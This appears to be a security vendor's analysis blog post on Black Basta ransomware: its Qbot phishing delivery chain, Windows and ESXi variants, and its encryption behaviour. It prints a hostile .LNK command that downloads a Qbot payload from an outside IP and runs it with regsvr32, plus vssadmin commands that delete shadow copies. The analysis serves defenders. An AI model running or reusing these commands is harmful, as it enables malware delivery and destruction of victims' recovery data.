mx-auto TextBlock_text__JUObc"><div class="paragraph-item"><h2>Introduction</h2><p>Despite its <a href="https://www.bleepingcomputer.com/news/security/new-black-basta-ransomware-springs-into-action-with-a-dozen-breaches/" target="_blank" rel="noopener">recent emergence</a> on the threat landscape, Black Basta ransomware is quickly becoming a significant threat that should be on the radar of SecOps teams worldwide. Black Basta has already executed multiple rapid-fire breaches by utilizing Qakbot/Qbot as its means of delivery and also targets Linux ESXi systems to amplify its potential impact on a targeted environment.</p><h2>Black Basta Origins</h2><p>Little is known about the group currently operating Black Basta, however, there may be an association with the now-defunct Conti group based on similarities in both actors’ TOR network sites. It has been <a href="https://twitter.com/VK_Intel/status/1557003350541242369/photo/1" target="_blank" rel="noopener">suggested</a> that Black Basta is a splinter-group that broke off from Conti during the latter’s collapse.</p><h2>Black Basta with Qbot – A powerful partner for attack</h2><p>Black Basta does not self-propagate. Instead, it relies on Qbot to propagate throughout a targeted environment before leveraging the banking trojan to deliver its payload.</p><p>Qbot has been a well-known presence on the threat landscape for more than a decade. It is most commonly distributed through large phishing email campaigns, often employing complex, multi-stage downloaders that use multiple file types including Office documents, .HTML files, .ISO, and .LNK files. Qbot also employs vulnerability exploits and relatively uncommon techniques such as <a href="https://www.bleepingcomputer.com/news/security/qbot-phishing-uses-windows-calculator-dll-hijacking-to-infect-devices/" target="_blank" rel="noopener">.DLL side-loading</a>.</p><p>A typical Qbot infection chain starts with a thread-hijacked email message; this is a response to an existing correspondence from a hijacked email account intended to trick the recipient into thinking the message is from someone they know and engage with.</p><figure style="float:none;width:568px;max-width:568px"><img asset_uid="blt1e4e1d589547368a" alt="Figure 1- Qbot infection email on a pre-existing thread. " src="https://www.deepinstinct.com/image/blt1e4e1d589547368a/62fcfad7f544494c40366c5d/figure1-qbot-infection-email.png"/><figcaption>Figure 1- Qbot infection email on a pre-existing thread.</figcaption></figure><p></p><p>The attached .HTML file contains an embedded, password protected .ZIP file which is dropped to the user’s Downloads directory when the .HTML file is opened.</p><figure style="float:none;width:634px;max-width:634px"><img asset_uid="blt74c43cee63ad9d4b" alt="Figure 2- Embedded .ZIP file in .HTML. " src="https://www.deepinstinct.com/image/blt74c43cee63ad9d4b/62fcfad81ed6c064a1d5a0d4/figure2-embedded-zip-file.png"/><figcaption>Figure 2- Embedded .ZIP file in .HTML.</figcaption></figure><p></p><p>The password protected .ZIP file (the password is provided in the email) contains a .LNK file which executes the following command in order to download the Qbot .DLL payload to the victim’s temp directory as “<em>goAlso.rtf</em>” and execute it using <em>regsvr32</em>.</p><figure style="float:none;width:705px;max-width:auto"><img asset_uid="blt3b8e1abb5272f287" alt="Figure 3- .LNK file responsible for download and execution of Qbot payload." src="https://www.deepinstinct.com/image/blt3b8e1abb5272f287/62fcfad7b4be734daff7f44c/figure3-lnk-file.png"/><figcaption>Figure 3- .LNK file responsible for download and execution of Qbot payload.</figcaption></figure><p></p><pre>%windir%\System32\cmd.exe /c %windir%\system32\curl -s -o %temp%\goAlso.rtf http[:]//146[.]70[.]79[.]52/fromMakeTell.dat&amp;&amp;%windir%\system32\regsvr32 %temp%\goAlso.rtf</pre><p></p><p>In this instance, Qbot’s .DLL payload is signed using a bogus certificate, which has since been revoked.</p><figure style="float:none;width:402px;max-width:auto"><img asset_uid="blta3374f8dc03cdd86" alt="Figure 4-Signed Qbot payload .DLL (valid at time of execution)." src="https://www.deepinstinct.com/image/blta3374f8dc03cdd86/62fcfad8c95e235432830526/figure4-signed-qbot.png"/><figcaption>Figure 4-Signed Qbot payload .DLL (valid at time of execution).</figcaption></figure><p></p><p>Following initial access, Qbot will employ tools such as Cobalt Strike and AdFind in order to move laterally across the network, enabling RDP log-ons and disabling defenses as it traverses the victim network.</p><h2>Black Basta Ransomware in Action</h2><p>Now we’ll look at how a Black Basta ransomware attack occurs. There are two different variants – the Windows variant and the ESXi variant.</p><h2>The Windows variant</h2><p>Black Basta is written in C++, does not employ code obfuscation or packing, and contains many hard-coded features, hinting that it may still be a work in progress.</p><p>Once delivered and executed, Black Basta will check for the presence of a hard-coded mutex (“<em>dsajdhas.0</em>”) and, if not found, will create it and proceed to delete shadow copies present on the victim’s system in order to inhibit recovery:</p><figure style="float:none;width:autopx;max-width:auto"><img asset_uid="blt23411912af3212c6" alt="Figure 5- Mutex Check." src="https://www.deepinstinct.com/image/blt23411912af3212c6/62fcfad89b71de52f5de8ccb/figure5-mutex-check.png"/><figcaption>Figure 5- Mutex Check.</figcaption></figure><p></p><figure style="float:none;width:auto;max-width:auto"><img asset_uid="bltf4fe8e89d84a94a6" alt="Figure 6- Mutex Creation." src="https://www.deepinstinct.com/image/bltf4fe8e89d84a94a6/62fcfad8da3c526fe63149ad/figure6-mutex-creation.png"/><figcaption>Figure 6- Mutex Creation.</figcaption></figure><p></p><figure style="float:none;width:536px;max-width:auto"><img asset_uid="bltbe302a18ddf0bb95" alt="Figure 7- Shadow copy deletion." src="https://www.deepinstinct.com/image/bltbe302a18ddf0bb95/62fcfad82914326e6e5fc98a/figure7-shadow-copy-deletion.png"/><figcaption>Figure 7- Shadow copy deletion.</figcaption></figure><p></p><p>The above partial snippet results in the commands below being executed on the victim‘s machine:</p><pre>cmd.exe /c C:\Windows\SysNative\vssadmin.exe delete shadows /all /quiet<br/>cmd.exe /c C:\Windows\System32\vssadmin.exe delete shadows /all /quiet<br/></pre><p></p><p>If the mutex is found, Black Basta will display a notification and terminate itself:</p><figure style="float:none;width:auto;max-width:auto"><img asset_uid="blt0dd622ad1da7c1fb" alt="Figure 8- Mutex detected." src="https://www.deepinstinct.com/image/blt0dd622ad1da7c1fb/62fcfad80ec5277181618289/figure8-mutex-detected.png"/><figcaption>Figure 8- Mutex detected.</figcaption></figure><p></p><p>This is common behavior in many types of ransomware.</p><h2>How does Black Basta Ransomware work?</h2><p>Following the deletion of shadow copies, Black Basta will modify the system’s wallpaper and set a default file icon for its own “<em>.basta</em>” encrypted file extension, both of which are hard-coded into the executable and written to the user’s <em>%temp%</em> directory (this technique is also quite common in ransomware).</p><figure style="float:none;width:autopx;max-width:auto"><img asset_uid="blte6f2d4adde9c72d2" alt="Figure 9- Sets Wallpaper." src="https://www.deepinstinct.com/image/blte6f2d4adde9c72d2/62fcfad89b71c064a05846c9/figure9-sets-wallpaper.png"/><figcaption>Figure 9- Sets Wallpaper.</figcaption></figure><p></p><figure style="float:none;width:auto;max-width:auto"><img asset_uid="blt503ed1a1ec312171" alt="Figure 10- Sets default file icon." src="https://www.deepinstinct.com/image/blt503ed1a1ec312171/62fcfad8c43eaf6744339958/figure10-sets-default-file-icon.png"/><figcaption>Figure 10- Sets default file icon.</figcaption></figure><p></p><p>Black Basta then encrypts files on the victim’s file system, excluding several file system locations and file extensions (including its own, listed below), in order to reduce the chances of completely “breaking” the executing machine; it does this by using a randomly generated ChaCha20 key which is then encrypted using a hard-coded RSA public key and appended to the end of every encrypted file.</p><p>The combination of ChaCha20 and RSA is likely to have been chosen due to its relative speed, which reduces the time it takes to encrypt large amounts of data.</p><p>Exclusions:</p><ul><li>$Recycle.Bin</li><li>Windows</li><li>Documents and Settings</li><li>Local Settings</li><li>Application Data</li><li>OUT.txt</li><li>boot</li><li>readme.txt (Its ransom note)</li><li>dlaksjdoiwq.jpg (Its wallpaper)</li><li>NTUSER.DAT</li><li>fkdjsadasd.ico (Its default file icon)</li><li>.com</li><li>.exe</li><li>.bat</li><li>.cmd</li><li>.basta (Its file extension)</li></ul><p>The ransom note, also hard-coded into the executable, is dropped at every file system location which is encrypted as “<em>readme.txt</em>” and contains a hard-coded “victim ID.” The ransom note refers the reader to Black Basta operator’s TOR site.</p><figure style="float:none;width:autopx;max-width:auto"><img asset_uid="bltea3a6f0ddda59d54" alt="Figure 11- Ransom note." src="https://www.deepinstinct.com/image/bltea3a6f0ddda59d54/62fcfae69b71de52f5de8ccf/figure11-ransom-note.png"/><figcaption>Figure 11- Ransom note.</figcaption></figure><p></p><p>Black Basta’s operators can also selectively encrypt specific file system paths by using built-in “<em>-forcepath</em>” command line parameters and providing a specific path to be encrypted. This enables the operators to encrypt specific paths without going through the entire machine, drastically reducing its execution time.</p><figure style="float:none;width:auto;max-width:auto"><img asset_uid="bltdf3c623b7eb119dc" alt="Figure 12- Forced path." src="https://www.deepinstinct.com/image/bltdf3c623b7eb119dc/62fcfae6ea0d864c464ac844/figure12-forced-path.png"/><figcaption>Figure 12- Forced path.</figcaption></figure><p></p><p>Examined Black Basta samples did not contain any data exfiltration mechanisms, and it is assumed that exfiltration of data takes place prior to the delivery of the ransomware payload.</p><h2>The ESXi variant</h2><p>Black Basta’s Linux/ESXi variant is very similar to the Windows variant; both variants contain the same hard-coded ransom note and use the same encryption scheme.</p><p>The ESXi variant encrypts data in “<em>/vmfs/volumes</em>,” which contains all the virtual machine data on an ESXi server, bringing everything that was running on that server to a grinding halt, all without “breaking” the server itself.</p><p>Additionally, it contains the same ability to encrypt specific operating system paths using the “-<em>forcepath</em>” command line parameter.</p><p>Of note, this variant can also be executed on Windows systems by means of Windows Sub-System for Linux (WSL), a technique that is attracting <a href="https://www.bleepingcomputer.com/news/security/new-windows-subsystem-for-linux-malware-steals-browser-auth-cookies/" target="_blank" rel="noopener">growing attention as an attack surface</a>.</p><h2>Conclusion: Black Basta ransomware detection and prevention with Deep Instinct</h2><p>While Black Basta is not particularly sophisticated, its employment of Qbot provides it with ample opportunities for attack.
